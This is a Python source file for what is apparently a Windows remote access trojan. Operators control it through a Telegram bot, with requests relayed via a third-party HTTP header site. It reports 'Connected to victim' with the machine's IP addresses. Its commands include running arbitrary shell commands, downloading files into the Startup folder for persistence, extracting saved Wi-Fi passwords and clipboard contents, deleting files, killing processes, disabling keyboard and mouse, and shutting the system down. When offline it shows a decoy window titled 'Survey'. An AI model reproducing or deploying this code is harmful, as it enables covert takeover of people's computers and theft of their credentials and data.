import requests
from os import chdir, getcwd, remove, startfile
from tkinter import Tk, Label, PhotoImage, messagebox, Toplevel
cwd = getcwd()
def check_internret():
    try:
        requests.get("https://www.google.com/")
        return True
    except: 
        return False
if check_internret():
    import json, wget, webbrowser
    from bs4 import BeautifulSoup
    from platform import uname
    from subprocess import getoutput, Popen
    from time import tzname, sleep, strftime
    from getpass import getuser
    from Its_Hub import Its_Hub
    from pyautogui import write, hotkey
    Hub = Its_Hub()
    os = Hub.OS()
    mouse = Hub.Mouse()
    keyboard = Hub.Keyboard()
    ip = requests.get("https://api.ipify.org/").text
    local_ip = os.Get_IP()
    token = BOT_TOKEN # 6622962602:AAERgZlXugMGZIA5vqkIpv5KKAAsDUrA6is
    id = TELEGRAM_ID
    commands = ["/check", 
                "/sysinfo", 
                "/get_clipboard", 
                "/set_clipboard", 
                "/kill_process", 
                "/open_site", 
                "/stop", 
                "/pass", 
                "/shutdown", 
                "/cmd", 
                "/download",
                "/connected_wifi",
                "/wifi_password",
                "/con_wifi_names",
                "/check_exist",
                "/whereami",
                "/startup",
                "/check_vm",
                "/mkdir",
                "/rm",
                "/create_file",
                "/show_error",
                "/show_info",
                "/show_warning",
                "/voice",
                "/dis_all",
                "/chdir",
                "/process",
                "/chruns",
                "/drivers",
                "/localhost", 
                "/open_app", 
                "/write_word", 
                "/hotkey"]
    def send_msg(message, token=token, id=id):
        try:
            url = f"https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text={message}"
            data = {"UrlBox":url,
                    "AgentList":"Internet Explorer",
                    "VersionsList":"HTTP/1.1",
                    "MethodList":"GET"}
            msg = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", data=data)
            if msg.status_code == 200: return True
            else: return False
        except: return False
    def read_msg(token=token):
        try:
            url = f"https://api.telegram.org/bot{token}/GetUpdates"
            data = {"UrlBox":url,
                    "AgentList":"Internet Explorer",
                    "VersionsList":"HTTP/1.1",
                    "MethodList":"GET"}
            source = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", data=data).content.decode()
            soup = BeautifulSoup(source, "html.parser")
            find_tag = json.loads(str(soup.findAll("pre"))[61:-7])
            return find_tag["result"][-1]["message"]["text"]
        except: return False
    def start():
        global cwd
        while True:
            command = read_msg()
            if command == "/pass": pass
            else:
                if command == "/check": send_msg("This is check message")
                if command == "/sysinfo":
                    try:
                        u = uname()
                        info = f"""IP: {ip}
Local IP: {local_ip}
System: {u[0]}
System Version: {u[2]}
OS Caption: {getoutput("wmic os get caption").replace(" ", "").replace("\n", "").replace("Caption", "")}
OS Architecture: {getoutput("wmic os get OSArchitecture").replace(" ", "").replace("\n", "").replace("OSArchitecture", "")}
Node: {u[1]}
Machine: {u[4]}
Time Zone: {tzname[0]}
User: {getuser()}
OS CPU: {getoutput("wmic cpu get name").replace("Name", "").replace(" ", "").replace("\n", "")}
CPU Cores: {getoutput("wmic cpu get numberofcores").replace("\n", "").replace("NumberOfCores", "").replace(" ", "")}
Firewall state: {getoutput("netsh advfirewall show publicprofile").replace("----------------------------------------------------------------------", "").replace("\n\n", "").replace(" ", "").split("\n")[1][-2:].lower()}"""
                        state = send_msg(info)
                    except: send_msg("Error;")
                if command == "/get_clipboard": 
                    try: send_msg(getoutput("powershell get-clipboard"))
                    except: send_msg("Error;")
                if command == "/set_clipboard":
                    try:
                        send_msg("write your text to copy(10 seconds):")
                        sleep(10)
                        data = read_msg()
                        getoutput(f"powershell set-clipboard '{data}'")
                        send_msg(f"Copied as {data}")
                    except: send_msg("Error;")
                if command == "/kill_process":
                    try:
                        send_msg("write task three first letters(10 seconds):")
                        sleep(10)
                        data = read_msg()
                        state = getoutput(f"taskkill /f /im {data}*")
                        if "SUCCESS" in state: send_msg(f"Process {data}... is complete closed.")
                        else: send_msg("I cant find the process.")
                    except: send_msg("Error;")
                if command == "/open_site":
                    try:
                        send_msg("write website URL(10 seconds):")
                        sleep(10)
                        data = read_msg()
                        webbrowser.open_new_tab(data)
                        send_msg(f"{data} is complete opened.")
                    except: send_msg("Error;")
                if command == "/stop":
                    try:
                        send_msg("When you stop this. you cant connect again. if you are sure send Y if not send N(in 10 seconds): ")
                        sleep(10)
                        text = read_msg()
                        if text == "Y" or text == "y": 
                            send_msg(f"Tunnel is closed at {strftime("%H : %M : %S")}.")
                            exit()
                        else: 
                            send_msg("Task is closed. Dont worry.")
                    except: send_msg("Error;")
                if command == "/shutdown": 
                    try:
                        send_msg("System is turned off")
                        getoutput("shutdown /s /f /t 0")
                        send_msg("Its turned off complete")
                    except: send_msg("Error;")
                if command == "/cmd":
                    try:
                        send_msg("write cmd command(10 seconds):")
                        sleep(10)
                        data = read_msg()
                        out = getoutput(data)
                        send_msg("This is the response:\n" + out)
                    except: send_msg("Error;")
                if command == "/download":
                    try:
                        send_msg("write file url(in 10 seconds):")
                        sleep(10)
                        url = read_msg()
                        send_msg("write path to install(in 10 seconds):")
                        sleep(10)
                        path = read_msg()
                        if path != url: wget.download(url, out=path)
                        else: wget.download(url)
                        send_msg("File is downloaded.")
                    except: send_msg("Error;")
                if command == "/connected_wifi":
                    try:
                        ssid = getoutput('netsh wlan show interfaces').replace("", "").replace("Thereis1interfaceonthesystem:", "").replace("Hostednetworkstatus:Notavailable", "").replace("\n\n\n", "").split("\n")[6].replace("SSID:", "")
                        send_msg(ssid)
                    except: send_msg("Error;")
                if command == "/wifi_password":
                    try:
                        send_msg("write SSID(in 10 seconds):")
                        sleep(10)
                        ssid = read_msg()
                        passw = getoutput(f"netsh wlan show profiles {ssid} key=clear").replace(" ", "").replace("ProfileoninterfaceWi-Fi:", "").replace("=======================================================================", "").replace("Applied:AllUserProfile", "").replace("Profileinformation", "").replace("-------------------", "").replace("\n\n\n\n\n\n\n\n", "").replace("-----------------", "").replace("-------------", "").replace("--", "").split("\n")
                        def find_password():
                            for i in range(len(passw)):
                                if "KeyContent" in passw[i]:
                                    return passw[i].replace("KeyContent:", "")
                        send_msg(find_password())
                    except: send_msg("Error;")
                if command == "/check_exist":
                    try:
                        send_msg("write your file address(in 8 seconds):")
                        sleep(8)
                        addr = read_msg()
                        send_msg("write your file name(in 8 seconds): ")
                        sleep(8)
                        file = read_msg()
                        if file != addr: state = os.Check_exist(addr, file)
                        else: os.Check_exist(File_name=file)
                        send_msg(f"This is the response:\n{state}")
                    except: send_msg("Error;")
                if command == "/commands": send_msg(f"{commands}")
                if command == "/con_wifi_names":
                    try:
                        names = getoutput("netsh wlan show profiles").replace("Profiles on interface Wi-Fi:", "").replace("Group policy profiles (read only)", "").replace("---------------------------------", "").replace("    <None>", "").replace("\n\n\n\n\n\n\n", "").replace("User profiles", "").replace("-------------", "").replace("    ", "").replace("\n\n", "").replace("All User Profile : ", "").split("\n")
                        names.remove("")
                        for i in range(len(names)): 
                            send_msg(f"Number {i + 1}: {names[i]}")
                    except: send_msg("Error;")
                if command == "/whereami": 
                    try: send_msg(os.Get_code_address())
                    except: send_msg("Error;")
                if command == "/startup":
                    try:
                        send_msg("Write your download link(in 10 seconds):")
                        sleep(10)
                        url = read_msg()
                        path = fr"C:\Users\{getuser()}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
                        wget.download(url, out=path)
                        send_msg("File is added to startup.")
                    except: send_msg("Error;")
                if command == "/check_vm":
                    try:
                        vm = getoutput("powershell wmic computersystem get model").replace("\n", "").replace("Model", "").replace(" ", "")
                        send_msg(vm)
                    except: send_msg("Error;")
                if command == "/mkdir":
                    try:
                        send_msg("write directory name(in 10 seconds):")
                        sleep(10)
                        name = read_msg()
                        os.Create_directory(name)
                        send_msg(f"{name} Directory is created.")
                    except: send_msg("Error;")
                if command == "/rm": 
                    try:
                        send_msg("write file name(in 10 seconds):")
                        sleep(10)
                        file = read_msg()
                        send_msg("write file address(in 10 seconds):")
                        sleep(10)
                        addr = read_msg()
                        if file != addr: 
                            remove(addr+file)
                            send_msg(f"{addr+file} is removed.")
                        else: 
                            remove(file)
                            send_msg(f"{file} is removed.")
                    except: send_msg("Error;")
                if command == "/create_file":
                    try:
                        send_msg("write your file name(in 10 seconds):")
                        sleep(10)
                        name = read_msg()
                        send_msg("write your file text(in 10 seconds):")
                        sleep(10)
                        text = read_msg()
                        with open(name, "w") as writer: writer.write(text)
                        send_msg(f"{name} is created.")
                    except: send_msg("Error;")
                if command == "/show_error": 
                    try:
                        send_msg("write the title of error message(in 10 seconds):")
                        sleep(10)
                        title = read_msg()
                        send_msg("write the text of error message(in 10 seconds):")
                        sleep(10)
                        text = read_msg()
                        messagebox.showerror(title, text)
                    except: send_msg("Error;")
                if command == "/show_info": 
                    try:
                        send_msg("write the title of info message(in 10 seconds):")
                        sleep(10)
                        title = read_msg()
                        send_msg("write the text of info message(in 10 seconds):")
                        sleep(10)
                        text = read_msg()
                        messagebox.showinfo(title, text)
                    except: send_msg("Error;")
                if command == "/show_warning": 
                    try:
                        send_msg("write the title of warning message(in 10 seconds):")
                        sleep(10)
                        title = read_msg()
                        send_msg("write the text of warning message(in 10 seconds):")
                        sleep(10)
                        text = read_msg()
                        messagebox.showwarning(title, text)
                    except: send_msg("Error;")
                if command == "/voice":
                    try:
                        send_msg("write your text(in 10 seconds):")
                        sleep(10)
                        text = read_msg()
                        voice = Hub.Voice(text)
                        voice.Say()
                    except: send_msg("Error;")
                if command == "/dis_all":
                    try:
                        keyboard.Disable_keyboard()
                        mouse.Disable_mouse()
                        send_msg("how many seconds disable(write number in 8 seconds)?")
                        sleep(8)
                        try:
                            num = int(read_msg())
                        except: 
                            send_msg("Invalid Input.")
                            break
                        sleep(num)
                        keyboard.Enable_keyboard()
                        mouse.Enable_mouse()
                        send_msg("Mouse and Keyboard is disabled.")
                    except: send_msg("Error;")
                if command == "/chdir":
                    try:
                        send_msg("write the address you want to go(in 10 seconds):")
                        sleep(10)
                        addr = read_msg()
                        chdir(addr)
                        send_msg(f"address changed to {addr}")
                    except: send_msg("Error;")
                if command == "/process":
                    try:
                        process = getoutput("wmic process get name").replace("Name", "").replace("\n\n", "").replace("System", "").replace("Secure", "").replace("Registry", "").split()
                        for i in process:
                            if i[-4:] == ".exe": send_msg(i)
                            else: pass
                            pass_state = read_msg()
                            if pass_state == "/pass": break
                    except: send_msg("Error;")
                if command == "/chruns": # Check run locations
                    try:
                        send_msg("write your app name(in 10 seconds): ")
                        sleep(10)
                        app = read_msg()
                        location = getoutput(f"wmic process where name=\"{app}\" get ExecutablePath")
                        send_msg(f"This is the response:\n{location}")
                    except: send_msg("Error;")
                if command == "/drivers":
                    try:
                        data = getoutput("net share").replace("Share name", "").replace("Resource", "").replace("Remark", "").replace("-------------------------------------------------------------------------------", "").replace("The command completed successfully.", "").replace("\n\n", "").replace("Default share","").replace("Remote IPC", "").replace("Remote Admin", "").replace(r"C:\windows", "").replace("IPC$", "").replace("ADMIN$", "").replace(" ", "").split()
                        send_msg(f"This is the response:\n{data}")
                    except: send_msg("Error;")
                if command == "/localhost":
                    try:
                        send_msg("write your port(in 8 seconds):")
                        sleep(8)
                        port = read_msg()
                        Popen(f"python -m http.server {port} -b {local_ip}", shell=True)
                        send_msg(f"Localhost is started at: http://{local_ip}:{port}")
                    except: send_msg("Error;")
                if command == "/open_app":
                    send_msg("write complete name of application(in 10 seconds || example: cmd.exe):")
                    sleep(10)
                    name = read_msg()
                    try:
                        startfile(name)
                        send_msg(f"{name} application is opened.")
                    except FileNotFoundError:
                        send_msg("File not found.")
                if command == "/write_word":
                    send_msg("write your text(in 5 seconds):")
                    sleep(5)
                    text = read_msg()
                    write(text)
                    send_msg(f"{text} is writed")
                if command == "/hotkey":
                    send_msg("write your hotkeys(in 10 seconds || split with space):")
                    sleep(10)
                    all_key = str(read_msg()).split(" ")
                    len_key = len(all_key)
                    if len_key == 1 and len_key != 0: hotkey(all_key[0])
                    else: hotkey(all_key[0], all_key[1])
                send_msg("click /pass")
                sleep(5)
    send_msg(f"Connected to victim with {ip}(local: {local_ip}) at {strftime("%H:%M:%S")}(Wait for closing trap. write /commands for help).")
TK_CODE
    start()
else:
    root = Tk()
    Label(root, text="Check Your internet connection", font=("", 15)).pack()
    root.title("Survey")
    root.geometry("300x300")
    # picture = PhotoImage(file = fr'{cwd}\MSTL\Files\icon.ico')
    # root.iconphoto(False, picture) 
    root.resizable(False, False)
    root.mainloop()
